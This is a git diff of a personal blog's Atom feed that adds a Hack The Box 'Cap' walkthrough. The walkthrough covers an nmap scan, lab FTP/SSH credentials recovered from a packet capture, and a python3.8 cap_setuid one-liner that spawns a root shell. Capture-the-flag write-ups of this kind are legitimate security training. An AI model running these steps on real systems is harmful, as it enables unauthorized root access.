@@ -1,4 +1,48 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-07T15:38:47-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Alex Loney</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Alex Loney</name></author><entry><title type="html">New Blog Who Dis</title><link href="http://localhost:4000/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>http://localhost:4000/blog/new-blog-who-dis</id><content type="html" xml:base="http://localhost:4000/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-07T15:57:35-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Alex Loney</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Cap Walkthrough</title><link href="http://localhost:4000/blog/walkthrough/htb/htb-cap/" rel="alternate" type="text/html" title="HTB: Cap Walkthrough" /><published>2021-06-07T15:42:00-07:00</published><updated>2021-06-07T15:42:00-07:00</updated><id>http://localhost:4000/blog/walkthrough/htb/htb-cap</id><content type="html" xml:base="http://localhost:4000/blog/walkthrough/htb/htb-cap/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;I began searching this box with a standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo nmap -sC -sV -oA nmap/cap 10.129.121.64
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 21:26 EDT
+Nmap scan report for 10.129.121.64
+Host is up (0.091s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    gunicorn
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+
+&lt;p&gt;From the above scan, there are ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; open, with port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; hosting an HTTP server. Visiting port 80 in a web browser has a web UI which shows various statistics about the web server, including allowing you to download the last 5 minutes of network traffic.&lt;/p&gt;
+
+&lt;p&gt;Looking at the download from this, it can be seen that the download starts at index 1, simply adjusting the download back by an index will give you a PCAP dump at index 0. When viewing this PCAP dump, it may be seen that it’s a recording of an FTP connection with the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan:Buck3tH4TF0RM3!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Those credentials work to log into the FTP server on the machine, which starts in the nome directory for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan&lt;/code&gt;. If you attempt the same FTP credentials via SSH, you’ll see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan&lt;/code&gt; user has the exact same username/password.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;Once logged into SSH, the privesc portion took me a bit, but you can eventually find that the executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/python3.8&lt;/code&gt; has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cap_setuid&lt;/code&gt; capabilities!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
+/usr/bin/python3.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/bin/traceroute6.iputils &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/bin/mtr-packet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What this means is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3.8&lt;/code&gt; executable has the ability to set the UID of the process, allowing it to run as a different user. You may read more about &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&quot;&gt;Linux Privilege Escalation using Capabilities&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/python3.8 -c &apos;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&apos;&lt;/code&gt; will instantly spawn a root shell.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="walkthrough" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="http://localhost:4000/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>http://localhost:4000/blog/new-blog-who-dis</id><content type="html" xml:base="http://localhost:4000/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
 
 &lt;p&gt;This blog is going to serve as my online researce for sharing InfoSec related topics, cooking, tech tips, and various other related material!&lt;/p&gt;
 
